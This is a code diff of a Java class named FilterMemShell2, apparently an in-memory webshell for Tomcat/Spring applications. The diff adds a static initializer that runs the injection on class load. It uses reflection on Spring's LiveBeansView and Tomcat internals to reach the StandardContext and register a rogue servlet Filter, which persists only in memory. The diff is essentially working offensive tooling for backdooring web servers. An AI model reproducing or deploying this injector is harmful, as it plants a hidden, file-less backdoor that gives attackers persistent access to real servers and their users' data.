@@ -12,13 +12,17 @@ import java.io.IOException;
 import java.io.PrintWriter;
 import java.lang.reflect.Field;
 
-public class FilterMemShell implements Filter {
-    private static FilterMemShell fms = new FilterMemShell();
+public class FilterMemShell2 implements Filter {
+    static {
+        new FilterMemShell2();
+    }
 
-    public FilterMemShell() {
+    public FilterMemShell2() {
         try {
-            ServletRequestAttributes attr = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
-            ServletContext servletContext = attr.getRequest().getServletContext();
+            java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
+            filed.setAccessible(true);
+            org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();
+            ServletContext servletContext = context.getServletContext();
             ApplicationContextFacade appCtxFacade = (ApplicationContextFacade) servletContext;
             Field appCtxField = ApplicationContextFacade.class.getDeclaredField("context");
             appCtxField.setAccessible(true);
@@ -28,9 +32,9 @@ public class FilterMemShell implements Filter {
             StandardContext stdCtx = (StandardContext) stdCtxField.get(appCtx);
 
             //1.添加filterDef
-            FilterMemShell filterMemShell = new FilterMemShell("abc");
+            FilterMemShell2 filterMemShell = new FilterMemShell2("abc");
             FilterDef filterDef = new FilterDef();
-            filterDef.setFilterClass("FilterMemShell");
+            filterDef.setFilterClass("FilterMemShell2");
             filterDef.setFilterName(filterMemShell.getClass().getName());
             filterDef.setFilter(filterMemShell);
             stdCtx.addFilterDef(filterDef);
@@ -63,7 +67,7 @@ public class FilterMemShell implements Filter {
         }
     }
 
-    public FilterMemShell(String anyStr) {
+    public FilterMemShell2(String anyStr) {
     }
 
     @Override
